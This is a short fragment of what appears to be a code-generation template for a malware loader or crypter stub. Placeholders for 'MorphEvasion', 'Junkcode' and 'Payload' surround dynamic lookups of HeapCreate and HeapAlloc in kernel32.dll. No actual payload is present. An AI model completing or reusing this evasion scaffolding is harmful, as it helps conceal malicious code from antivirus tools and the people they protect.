    ...
    {{{MorphEvasion1}}}
        {{{MorphEvasion2}}}
            {{{MorphEvasion3}}}
                ...
                {{{Junkcode3}}}
                {{{Payload}}}
                FARPROC {{{NdcHeapcreate}}} = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"HeapCreate\");
                FARPROC {{{NdcHeapalloc}}}  = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"HeapAlloc\");
                {{{Junkcode4}}}
